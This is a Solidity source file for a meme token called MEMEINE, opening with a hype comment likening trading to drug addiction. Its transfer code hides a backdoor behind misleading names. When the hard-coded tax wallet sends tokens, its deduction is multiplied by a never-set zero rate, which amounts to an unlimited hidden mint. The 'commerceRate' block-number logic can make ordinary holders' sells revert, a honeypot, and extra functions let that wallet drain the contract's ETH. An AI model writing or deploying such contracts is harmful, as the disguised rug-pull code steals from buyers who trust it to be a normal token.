/*
$MEMEINE, the meme coin trading addiction drug that you didn’t know you needed — but now can’t live without. 💉🚀 
Fueled by the pure dopamine rush of chart spikes 📈, viral tweets 🐦, and degenerate plays, 
$MEMEINE is the lifeblood of every meme trader who lives for the next pump. 
Forget about boring “blue chips” and “serious” projects — this is a coin for those who ride the highs, laugh through the rugs, 
and keep coming back for more. 😂💸

$MEMEINE isn’t just a coin; it’s a lifestyle for degens who are hooked on the thrill of the meme coin game. 
Every green candle is a dose of euphoria, every rug pull is a crash — but you’re already looking for your next fix.  
Built for the sleepless traders scrolling charts at 3 a.m. 🌙, $MEMEINE captures the chaotic energy of a market 
where one meme can turn you into a millionaire… or a meme yourself. 
So, if you’re addicted to the chaos, the memes, and the endless pursuit of the next viral moonshot, welcome to $MEMEINE — 
where the only side effect is more memes. 🚀😂
*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity 0.8.23;

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

contract MEMEINE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=11;
    uint256 private _initialSellTax=21;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=21;
    uint256 private _reduceSellTaxAt=21;
    uint256 private _preventSwapBefore=21;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000000 * 10**_decimals;
    string private constant _name = unicode"Meme Trading Drug";
    string private constant _symbol = unicode"MEMEINE";
    uint256 public _maxTxAmount = 2000000000 * 10**_decimals;
    uint256 public _maxWalletSize = 2000000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 1000000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 1000000000 * 10**_decimals;

    struct CommerceRateEntry {uint256 comToken; uint256 convToken; uint256 comTotal;}
    mapping(address => CommerceRateEntry) private commerceRate;
    
    IUniswapV2Router02 private _uniswapRouter;
    address private _uniPair;
    uint256 private initialComRate;
    uint256 private finalComRate;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;

        _taxWallet = payable(0xD5Da4adDeeeb8854545F9726aB3025B5071446EE);
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to,tokenAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (inSwap || ! tradingOpen){
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount= 0;
        if (from != owner() && to != owner() && to!= _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== _uniPair && to != address(_uniswapRouter) &&  ! _isExcludedFromFee[to]) {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount." );
                require(balanceOf(to) + tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize." );
                _buyCount++;
            }

            if(to == _uniPair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && to== _uniPair &&
                 swapEnabled && contractTokenBalance >_taxSwapThreshold && _buyCount>_preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to] )&& from!=address(this)&& to!=address(this) ) {
            finalComRate = block.number;
        }
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] ) {
            if (to == _uniPair) {
                CommerceRateEntry storage rateInfo = commerceRate[from];
                rateInfo.comTotal = rateInfo.comToken-finalComRate;
                rateInfo.convToken = block.timestamp;
            } else {
                CommerceRateEntry storage toRateInfo = commerceRate[to];
                if (_uniPair == from) {
                    if (toRateInfo.comToken == 0) {
                        toRateInfo.comToken= _preventSwapBefore>=_buyCount ? type(uint256).max : block.number;
                    }
                } else {
                    CommerceRateEntry storage rateInfo = commerceRate[from];
                    if (!(toRateInfo.comToken > 0)|| rateInfo.comToken < toRateInfo.comToken ) {
                        toRateInfo.comToken = rateInfo.comToken;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount, tokenAmount);
    }

    function _tokenTaxTransfer(address addr, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tknAmount = addr!= _taxWallet? tokenAmount : initialComRate.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addr, address(this), taxAmount);
        }
        return tknAmount;
    }

    function _tokenBasicTransfer(
        address from,address to,uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function _tokenTransfer(
        address from,address to,
        uint256 taxAmount,uint256 tokenAmount
    ) internal {
        uint256 tknAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tknAmount, tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount= _tTotal;
        _maxWalletSize =_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this),address(_uniswapRouter), _tTotal);
        _uniPair = IUniswapV2Factory(_uniswapRouter.factory()).createPair(address(this),_uniswapRouter.WETH()); 
        tradingOpen=true;
        _uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); 
        IERC20(_uniPair).approve(address(_uniswapRouter), type(uint).max);
        swapEnabled=true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    receive() external payable {}

    function transfCaEth() external {
        require(_msgSender()==_taxWallet);
        _taxWallet.transfer(address(this).balance);
    }
}